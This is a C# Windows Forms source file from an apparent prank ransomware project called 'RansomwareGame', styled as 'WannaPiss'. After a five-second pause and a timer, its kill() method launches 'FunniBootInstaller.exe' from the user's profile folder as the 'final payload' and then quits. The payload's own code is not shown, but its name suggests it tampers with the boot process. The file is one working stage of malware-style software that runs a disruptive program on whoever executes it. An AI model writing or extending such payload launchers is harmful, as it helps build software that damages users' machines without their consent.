using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomwareGame
{
    public partial class Form5 : Form
    {
        public Form5()
        {
            InitializeComponent();

            //pause for 5 seconds
            System.Threading.Thread.Sleep(5000);

            timer1.Interval = 5000;
            timer1.Start();
        }

        void kill() {
            // Get file location
            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string payloadPath = userDirectory + "\\WannaPiss\\FunniBootInstaller.exe";

            // Start payload
            System.Diagnostics.Process.Start(payloadPath);

            // Quit GUI
            Environment.Exit(0);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // Run the final payload
            kill();
        }
    }
}
